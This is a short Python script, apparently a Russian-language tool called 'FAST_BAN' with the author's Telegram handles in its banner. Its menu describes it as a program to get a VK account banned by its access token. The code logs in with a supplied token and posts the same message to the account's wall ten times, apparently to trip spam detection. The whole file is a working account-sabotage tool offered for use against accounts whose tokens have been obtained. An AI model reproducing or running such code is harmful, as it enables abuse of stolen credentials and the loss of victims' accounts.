import requests
import os
import vk_api
def fastban():
    os.system("clear")
    intro = """                           
    ▐▐▐▐▐▐▐▐       ▐▐▐▐▐▐      ▐▐     ▐▐     ▐▐
    ▐▐             ▐▐   ▐▐   ▐▐  ▐▐   ▐▐▐▐   ▐▐
    ▐▐▐▐▐▐  ▐▐▐▐▐  ▐▐▐▐▐▐    ▐▐  ▐▐   ▐▐ ▐▐  ▐▐
    ▐▐             ▐▐   ▐▐   ▐▐▐▐▐▐   ▐▐  ▐▐ ▐▐
    ▐▐             ▐▐   ▐▐   ▐▐  ▐▐   ▐▐   ▐▐▐▐
    ▐▐             ▐▐▐▐▐▐    ▐▐  ▐▐   ▐▐     ▐▐

    FAST_BAN DEVOLOPER DARK KODING
    TELEGRAM: @affonsy    CHANNEL @darkkoding
    Beta version 
    """
    print(intro)
    print("""
    ПРОГРАММА ДЛЯ БАНА АККАУНТА ВК ПО ТОКЕНУ
    1.ВВЕДИТЕ ТОКЕН В ПОЛЕ ДЛЯ ВВОДА
    2.ОЖИДАЙТЕ РЕЗУЛЬТАТ В ТЕЧЕНИИ 15 СЕКУНД
    """)
    tok = input("[ACCESS-TOKEN] : ") 
    token = vk_api.VkApi(token = tok) 
    vk = token.get_api()
    for var in range(10):
        vk.wall.post(message='Сова никогда не спит')
fastban()
